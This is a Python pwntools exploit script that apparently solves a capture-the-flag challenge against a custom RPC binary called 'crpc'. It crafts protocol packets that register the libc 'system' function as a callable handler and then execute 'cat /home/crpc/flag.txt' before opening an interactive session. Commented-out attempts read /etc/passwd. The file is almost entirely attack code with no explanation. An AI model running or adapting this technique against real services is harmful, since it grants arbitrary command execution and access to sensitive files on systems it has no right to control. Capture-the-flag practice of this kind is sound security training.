from pwn import *

context.log_level = 'debug'
p = process('./crpc')

'''
typedef struct {
    uint32_t header;
    uint8_t type;
    uint32_t request_id;
    char* func_name;
    uint32_t name_length;
    char name[32];
    uint32_t param_length;
    char params[256];
} RequestMessage;

typedef struct {
    uint32_t length;
    uint8_t type;
    uint32_t request_id;
    uint8_t status;
    uint32_t result_length;
    char result[256];
} ResponseMessage;

enum Type{
    ERROR = 0x01,
    REGISTER,
    UNREGISTER,
    PING,
    PONG,
    EXECUTE
};
'''

def request_packet(types, request_id, func_name, params):
    name_length = len(func_name)
    param_length = len(params)

    payload = p32(0xe0f1d2c3)
    payload += p32(types)
    payload += p32(request_id)
    payload += p64(0)
    payload += p32(0) # padding?
    payload += p32(name_length)
    payload += func_name
    payload += b'\x00'*(32-name_length)
    payload += p32(param_length)
    payload += params
    payload += b'\x00'*(256-param_length)
    return payload

# payload = request_packet(0x02, 1, b"handle_open", b"/etc/passwd")
# p.send(payload)
# response_message = p.recv(0x1000)
# print(response_message)
# print('-'*0x30)

# payload = request_packet(0x06, 1, b"handle_open", b".")
# p.send(payload)
# response_message = p.recv(0x1000)
# print(response_message)
# print('-'*0x30)


payload = request_packet(0x02, 1, b"system", b".")
p.send(payload)
response_message = p.recv(0x1000)
print(hexdump(response_message))
print('-'*0x30)

payload = request_packet(0x06, 1, b"system", b"cat /home/crpc/flag.txt")
p.send(payload)

response_message = p.recv(0x1000)
print(hexdump(response_message))
print('-'*0x30)


p.interactive()

